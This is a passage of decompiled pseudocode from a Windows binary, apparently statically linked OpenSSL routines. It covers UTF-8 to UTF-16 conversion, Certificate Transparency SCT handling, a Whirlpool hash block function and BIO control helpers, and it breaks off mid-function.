//----- (004D63E0) --------------------------------------------------------
_BYTE *__cdecl sub_4D63E0(const char *a1, signed int a2, _DWORD *a3, size_t *a4)
{
  signed int v4; // edi
  signed int v5; // esi
  int v6; // ebx
  int v7; // eax
  _BYTE *v8; // eax
  _BYTE *v9; // ebx
  signed int v10; // ebp
  _BYTE *i; // esi
  int v12; // eax
  unsigned int v13; // ecx
  _BYTE *v14; // esi
  __int16 v15; // cx
  _BYTE *v17; // esi
  unsigned int v18; // [esp+10h] [ebp-8h] BYREF
  size_t v19; // [esp+14h] [ebp-4h]
  _BYTE *v20; // [esp+20h] [ebp+8h]

  v4 = a2;
  v5 = 0;
  v18 = 0;
  if ( a2 == -1 )
    v4 = strlen(a1);
  v6 = 0;
  if ( v4 <= 0 )
  {
LABEL_10:
    v19 = v6 + 2;
    v8 = sub_4133F0(v6 + 2);
    v9 = v8;
    v20 = v8;
    if ( v8 )
    {
      v10 = 0;
      for ( i = v8; v10 < v4; i = v17 + 1 )
      {
        v12 = sub_4719F0((char *)&a1[v10], v4 - v10, &v18);
        if ( v18 < 0x10000 )
        {
          *i = BYTE1(v18);
          LOBYTE(v15) = v18;
        }
        else
        {
          v13 = v18 - 0x10000;
          v18 = v13;
          *i = (unsigned __int16)((v13 >> 10) - 10240) >> 8;
          v9 = v20;
          v14 = i + 1;
          *v14 = v13 >> 10;
          v15 = (v13 & 0x3FF) - 9216;
          i = v14 + 1;
          *i = HIBYTE(v15);
        }
        v17 = i + 1;
        *v17 = v15;
        v10 += v12;
      }
      *i = 0;
      i[1] = 0;
      if ( a4 )
        *a4 = v19;
      if ( a3 )
        *a3 = v9;
      return v9;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    while ( 1 )
    {
      v7 = sub_4719F0((char *)&a1[v5], v4 - v5, &v18);
      if ( v7 < 0 )
        return sub_4D6360(a1, v4, a3, a4);
      if ( v18 > 0x10FFFF )
        return 0;
      if ( v18 < 0x10000 )
        v6 += 2;
      else
        v6 += 4;
      v5 += v7;
      if ( v5 >= v4 )
        goto LABEL_10;
    }
  }
}

//----- (004D6560) --------------------------------------------------------
_DWORD *sub_4D6560()
{
  _DWORD *result; // eax

  result = sub_413430(0x40u);
  if ( result )
  {
    result[13] = -1;
    *result = -1;
  }
  else
  {
    sub_408310(50, 100, 65, (int)"crypto\\ct\\ct_sct.c", 27);
    return 0;
  }
  return result;
}

//----- (004D65A0) --------------------------------------------------------
void __cdecl sub_4D65A0(void **Block)
{
  if ( Block )
  {
    sub_413490(Block[3]);
    sub_413490(Block[8]);
    sub_413490(Block[11]);
    sub_413490(Block[1]);
    sub_413490(Block);
  }
}

//----- (004D6600) --------------------------------------------------------
int __cdecl sub_4D6600(int a1, void *Src, size_t Size)
{
  void *v3; // eax

  sub_413490(*(void **)(a1 + 44));
  *(_DWORD *)(a1 + 44) = 0;
  *(_DWORD *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 60) = 0;
  if ( Src && Size )
  {
    v3 = sub_424800(Src, Size);
    *(_DWORD *)(a1 + 44) = v3;
    if ( !v3 )
    {
      sub_408310(50, 116, 65, (int)"crypto\\ct\\ct_sct.c", 181);
      return 0;
    }
    *(_DWORD *)(a1 + 48) = Size;
  }
  return 1;
}

//----- (004D6690) --------------------------------------------------------
int __cdecl sub_4D6690(int a1)
{
  if ( !*(_DWORD *)a1 && *(_BYTE *)(a1 + 40) == 4 )
  {
    if ( *(_BYTE *)(a1 + 41) == 1 )
      return 668;
    if ( *(_BYTE *)(a1 + 41) == 3 )
      return 794;
  }
  return 0;
}

//----- (004D66C0) --------------------------------------------------------
BOOL __cdecl sub_4D66C0(int a1)
{
  return !*(_DWORD *)a1
      && *(_BYTE *)(a1 + 40) == 4
      && (*(_BYTE *)(a1 + 41) == 1 || *(_BYTE *)(a1 + 41) == 3)
      && *(_DWORD *)(a1 + 44)
      && *(_DWORD *)(a1 + 48);
}

//----- (004D6700) --------------------------------------------------------
BOOL __cdecl sub_4D6700(_DWORD *a1)
{
  if ( *a1 == -1 )
    return 0;
  if ( *a1 )
    return a1[1] != 0;
  return a1[3] && sub_4D66C0((int)a1);
}

//----- (004D6740) --------------------------------------------------------
int __cdecl sub_4D6740(int **a1, _BYTE *a2, unsigned int a3)
{
  int i; // ebp
  int result; // eax
  _BYTE *v5; // edx
  unsigned int v6; // ecx
  _BYTE *v7; // esi

  for ( i = 0; i < sub_426A30((int)*a1); ++i )
  {
    result = sub_426A40(*a1, i);
    v5 = a2;
    v6 = a3;
    v7 = (_BYTE *)(result + 4);
    if ( a3 < 4 )
    {
LABEL_5:
      if ( !v6 || *v5 == *v7 && (v6 <= 1 || v5[1] == v7[1] && (v6 <= 2 || v5[2] == v7[2])) )
        return result;
    }
    else
    {
      while ( *(_DWORD *)v7 == *(_DWORD *)v5 )
      {
        v6 -= 4;
        v5 += 4;
        v7 += 4;
        if ( v6 < 4 )
          goto LABEL_5;
      }
    }
  }
  return 0;
}

//----- (004D6800) --------------------------------------------------------
int __cdecl sub_4D6800(__m64 *a1, __m64 *a2, int a3)
{
  __m64 *v3; // edi
  __m64 m64_u64; // mm0
  __m64 v5; // mm1
  __m64 v6; // mm2
  __m64 v7; // mm3
  __m64 v8; // mm4
  __m64 v9; // mm5
  __m64 v10; // mm6
  __m64 v11; // mm7
  int v12; // esi
  __m64 v13; // mm7
  __m64 v14; // mm1
  __m64 v15; // mm2
  __m64 v16; // mm3
  __m64 v17; // mm4
  __m64 v18; // mm5
  __m64 v19; // mm6
  __m64 v20; // mm7
  __m64 v21; // mm0
  __m64 v22; // mm1
  __m64 v23; // mm2
  __m64 v24; // mm3
  __m64 v25; // mm4
  __m64 v26; // mm5
  __m64 v27; // mm6
  int result; // eax
  __m64 v29; // [esp+0h] [ebp-A4h]
  __m64 v30; // [esp+8h] [ebp-9Ch]
  __m64 v31; // [esp+10h] [ebp-94h]
  __m64 v32; // [esp+18h] [ebp-8Ch]
  __m64 v33; // [esp+20h] [ebp-84h]
  __m64 v34; // [esp+28h] [ebp-7Ch]
  __m64 v35; // [esp+30h] [ebp-74h]
  __m64 v36; // [esp+38h] [ebp-6Ch]
  __m64 v37; // [esp+40h] [ebp-64h]
  __m64 v38; // [esp+48h] [ebp-5Ch]
  __m64 v39; // [esp+50h] [ebp-54h]
  __m64 v40; // [esp+58h] [ebp-4Ch]
  __m64 v41; // [esp+60h] [ebp-44h]
  __m64 v42; // [esp+68h] [ebp-3Ch]
  __m64 v43; // [esp+70h] [ebp-34h]
  __m64 v44; // [esp+78h] [ebp-2Ch]
  __m64 *v45; // [esp+84h] [ebp-20h]
  int v47; // [esp+8Ch] [ebp-18h]

  v3 = a2;
  v45 = a2;
  m64_u64 = (__m64)a1->m64_u64;
  v5 = a1[1];
  v6 = a1[2];
  v7 = a1[3];
  v8 = a1[4];
  v9 = a1[5];
  v10 = a1[6];
  v11 = a1[7];
  while ( 1 )
  {
    v29 = m64_u64;
    v30 = v5;
    v31 = v6;
    v32 = v7;
    v33 = v8;
    v34 = v9;
    v35 = v10;
    v36 = v11;
    v37 = _m_pxor(m64_u64, (__m64)v3->m64_u64);
    v38 = _m_pxor(v5, v3[1]);
    v39 = _m_pxor(v6, v3[2]);
    v40 = _m_pxor(v7, v3[3]);
    v41 = _m_pxor(v8, v3[4]);
    v42 = _m_pxor(v9, v3[5]);
    v43 = _m_pxor(v10, v3[6]);
    v44 = _m_pxor(v11, v3[7]);
    v12 = 0;
    v47 = 0;
    while ( 1 )
    {
      v13 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[7]] + 1),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[6]] + 2)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[5]] + 3)),
                      *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[4] + 1]),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[3] + 1] + 1)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[2] + 1] + 2)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[1] + 1] + 3)),
              *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[0]]);
      v14 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[1] + 1] + 3),
                          *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[0]]),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[7]] + 1)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[6]] + 2)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[5]] + 3)),
                  *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[4] + 1]),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[3] + 1] + 1)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[2] + 1] + 2));
      v15 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[2] + 1] + 2),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[1] + 1] + 3)),
                        *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[0]]),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[7]] + 1)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[6]] + 2)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[5]] + 3)),
                *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[4] + 1]),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[3] + 1] + 1));
      v16 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[3] + 1] + 1),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[2] + 1] + 2)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[1] + 1] + 3)),
                      *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[0]]),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[7]] + 1)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[6]] + 2)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[5]] + 3)),
              *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[4] + 1]);
      v17 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[4] + 1],
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[3] + 1] + 1)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[2] + 1] + 2)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[1] + 1] + 3)),
                    *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[0]]),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[7]] + 1)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[6]] + 2)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[5]] + 3));
      v18 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[5]] + 3),
                          *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[4] + 1]),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[3] + 1] + 1)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[2] + 1] + 2)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[1] + 1] + 3)),
                  *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[0]]),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[7]] + 1)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[6]] + 2));
      v19 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[6]] + 2),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[5]] + 3)),
                        *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[4] + 1]),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[3] + 1] + 1)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[2] + 1] + 2)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[1] + 1] + 3)),
                *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[0]]),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[7]] + 1));
      v29 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(
                            *(__m64 *)&dword_4D7860[2 * v12 + 504],
                            *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v29.m64_u8[0]]),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v30.m64_u8[7]] + 1)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v31.m64_u8[6]] + 2)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v32.m64_u8[5]] + 3)),
                    *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v33.m64_u8[4] + 1]),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v34.m64_u8[3] + 1] + 1)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v35.m64_u8[2] + 1] + 2)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v36.m64_u8[1] + 1] + 3));
      v30 = v14;
      v31 = v15;
      v32 = v16;
      v33 = v17;
      v34 = v18;
      v35 = v19;
      v36 = v13;
      v20 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v13, *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[7]] + 1)),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[6]] + 2)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[5]] + 3)),
                      *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[4] + 1]),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[3] + 1] + 1)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[2] + 1] + 2)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[1] + 1] + 3)),
              *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[0]]);
      v21 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v29, *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[0]]),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[7]] + 1)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[6]] + 2)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[5]] + 3)),
                    *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[4] + 1]),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[3] + 1] + 1)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[2] + 1] + 2)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[1] + 1] + 3));
      v22 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v14, *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[1] + 1] + 3)),
                          *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[0]]),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[7]] + 1)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[6]] + 2)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[5]] + 3)),
                  *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[4] + 1]),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[3] + 1] + 1)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[2] + 1] + 2));
      v23 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v15, *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[2] + 1] + 2)),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[1] + 1] + 3)),
                        *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[0]]),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[7]] + 1)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[6]] + 2)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[5]] + 3)),
                *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[4] + 1]),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[3] + 1] + 1));
      v24 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v16, *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[3] + 1] + 1)),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[2] + 1] + 2)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[1] + 1] + 3)),
                      *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[0]]),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[7]] + 1)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[6]] + 2)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[5]] + 3)),
              *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[4] + 1]);
      v25 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v17, *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[4] + 1]),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[3] + 1] + 1)),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[2] + 1] + 2)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[1] + 1] + 3)),
                    *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[0]]),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[7]] + 1)),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[6]] + 2)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[5]] + 3));
      v26 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v18, *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[5]] + 3)),
                          *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[4] + 1]),
                        *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[3] + 1] + 1)),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[2] + 1] + 2)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[1] + 1] + 3)),
                  *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[0]]),
                *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[7]] + 1)),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[6]] + 2));
      v27 = _m_pxor(
              _m_pxor(
                _m_pxor(
                  _m_pxor(
                    _m_pxor(
                      _m_pxor(
                        _m_pxor(
                          _m_pxor(v19, *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v37.m64_u8[6]] + 2)),
                          *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v38.m64_u8[5]] + 3)),
                        *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v39.m64_u8[4] + 1]),
                      *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v40.m64_u8[3] + 1] + 1)),
                    *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v41.m64_u8[2] + 1] + 2)),
                  *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v42.m64_u8[1] + 1] + 3)),
                *(__m64 *)&WHIRLPOOL_Constants_4D7040[4 * v43.m64_u8[0]]),
              *(__m64 *)((char *)&WHIRLPOOL_Constants_4D7040[4 * v44.m64_u8[7]] + 1));
      v12 = v47 + 1;
      if ( v47 == 9 )
        break;
      ++v47;
      v37 = v21;
      v38 = v22;
      v39 = v23;
      v40 = v24;
      v41 = v25;
      v42 = v26;
      v43 = v27;
      v44 = v20;
    }
    m64_u64 = _m_pxor(_m_pxor(v21, (__m64)v45->m64_u64), (__m64)a1->m64_u64);
    v5 = _m_pxor(_m_pxor(v22, v45[1]), a1[1]);
    v6 = _m_pxor(_m_pxor(v23, v45[2]), a1[2]);
    v7 = _m_pxor(_m_pxor(v24, v45[3]), a1[3]);
    v8 = _m_pxor(_m_pxor(v25, v45[4]), a1[4]);
    v9 = _m_pxor(_m_pxor(v26, v45[5]), a1[5]);
    v10 = _m_pxor(_m_pxor(v27, v45[6]), a1[6]);
    v11 = _m_pxor(_m_pxor(v20, v45[7]), a1[7]);
    a1->m64_u64 = (unsigned __int64)m64_u64;
    a1[1].m64_u64 = (unsigned __int64)v5;
    a1[2].m64_u64 = (unsigned __int64)v6;
    a1[3].m64_u64 = (unsigned __int64)v7;
    a1[4].m64_u64 = (unsigned __int64)v8;
    a1[5].m64_u64 = (unsigned __int64)v9;
    a1[6].m64_u64 = (unsigned __int64)v10;
    a1[7].m64_u64 = (unsigned __int64)v11;
    v3 = v45 + 8;
    result = a3 - 1;
    if ( a3 == 1 )
      break;
    v45 += 8;
    --a3;
  }
  _m_empty();
  return result;
}
// 4D7040: using guessed type int WHIRLPOOL_Constants_4D7040[512];
// 4D7860: using guessed type int[512];

//----- (004D80F0) --------------------------------------------------------
int __usercall sub_4D80F0@<eax>(
        _DWORD *a1@<esi>,
        int a2,
        void (__cdecl *a3)(int, _DWORD *, _DWORD *, _DWORD *),
        int a4)
{
  int *v4; // ebx
  int result; // eax
  int v6; // eax
  int v7; // edi
  int v8; // eax
  int v9; // [esp-10h] [ebp-14h]
  int v10; // [esp-10h] [ebp-14h]
  int v11; // [esp-Ch] [ebp-10h]
  int v12; // [esp-Ch] [ebp-10h]

  v4 = a1 + 13;
  if ( (int)a1[13] <= 0 )
    return 1;
  v11 = a1[13];
  v9 = a1[14] + a1[12];
  v6 = sub_405540(a2);
  v7 = sub_405110(v6, v9, v11);
  if ( v7 > 0 )
  {
    while ( 1 )
    {
      *v4 -= v7;
      if ( *v4 <= 0 )
        break;
      a1[14] += v7;
      v12 = *v4;
      v10 = a1[14] + a1[12];
      v8 = sub_405540(a2);
      result = sub_405110(v8, v10, v12);
      v7 = result;
      if ( result <= 0 )
        return result;
    }
    if ( a3 )
      a3(a2, a1 + 12, a1 + 13, a1 + 15);
    *a1 = a4;
    a1[14] = 0;
  }
  return v7;
}

//----- (004D8190) --------------------------------------------------------
int __usercall sub_4D8190@<eax>(
        int a1@<edi>,
        _DWORD *a2@<esi>,
        int (__cdecl *a3)(int, _DWORD *, _DWORD *, _DWORD *),
        int a4,
        int a5)
{
  if ( !a3 || a3(a1, a2 + 12, a2 + 13, a2 + 15) )
  {
    if ( (int)a2[13] <= 0 )
      *a2 = a5;
    else
      *a2 = a4;
    return 1;
  }
  else
  {
    sub_405010(a1, 15);
    return 0;
  }
}

//----- (004D81E0) --------------------------------------------------------
int __cdecl sub_4D81E0(int a1, int a2, int a3)
{
  int result; // eax

  result = sub_405540(a1);
  if ( result )
    return sub_405040(result, a2, a3);
  return result;
}

//----- (004D8200) --------------------------------------------------------
_DWORD *__cdecl sub_4D8200(int a1, int a2, int a3)
{
  _DWORD *result; // eax

  result = (_DWORD *)sub_405540(a1);
  if ( result )
    return (_DWORD *)sub_405290(result, a2, a3);
  return result;
}

//----- (004D8220) --------------------------------------------------------
int __cdecl sub_4D8220(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax
  int v5; // esi
  _DWORD *v6; // ebx

  result = sub_404FF0(a1);
  v5 = result;
  if ( result )
  {
    v6 = (_DWORD *)sub_405540(a1);
    switch ( a2 )
    {
      case 11:
        if ( !v6
          || *(_DWORD *)v5 == 2
          && !sub_4D8190(a1, (_DWORD *)v5, *(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *))(v5 + 40), 5, 6) )
        {
          goto LABEL_16;
        }
        if ( *(_DWORD *)v5 != 5
          || (result = sub_4D80F0((_DWORD *)v5, a1, *(void (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *))(v5 + 44), 6),
              result > 0) )
        {
          if ( *(_DWORD *)v5 == 6 )
            goto LABEL_18;
          sub_405010(a1, 15);
          goto LABEL_16;
        }
        break;
      case 149:
        *(_DWORD *)(v5 + 32) = *a4;
        *(_DWORD *)(v5 + 36) = a4[1];
        result = 1;
        break;
      case 150:
        *a4 = *(_DWORD *)(v5 + 32);
        a4[1] = *(_DWORD *)(v5 + 36);
        result = 1;
        break;
      case 151:
        *(_DWORD *)(v5 + 40) = *a4;
        *(_DWORD *)(v5 + 44) = a4[1];
        result = 1;
        break;
      case 152:
        *a4 = *(_DWORD *)(v5 + 40);
        a4[1] = *(_DWORD *)(v5 + 44);
        result = 1;
        break;
      case 153:
        *(_DWORD *)(v5 + 60) = a4;
        result = 1;
        break;
      case 154:
        *a4 = *(_DWORD *)(v5 + 60);
        result = 1;
        break;
      default:
        if ( v6 )
LABEL_18:
          result = sub_405390(v6, a2, a3, (int)a4);
        else
LABEL_16:
          result = 0;
        break;
    }
  }
  return result;
}

//----- (004D8420) --------------------------------------------------------
int __cdecl sub_4D8420(int a1)
{
  _DWORD *v1; // esi
  void *v2; // eax

  v1 = sub_413430(0x40u);
  if ( v1 )
  {
    v2 = sub_4133F0(0x14u);
    v1[1] = v2;
    if ( v2 )
    {
      v1[2] = 20;
      v1[6] = 0;
      v1[7] = 4;
      *v1 = 0;
      sub_404FE0(a1, (int)v1);
      sub_405000(a1, 1);
      return 1;
    }
    sub_413490(v1);
  }
  return 0;
}

//----- (004D84A0) --------------------------------------------------------
int __cdecl sub_4D84A0(_DWORD *a1, int a2, int a3)
{
  int v3; // esi
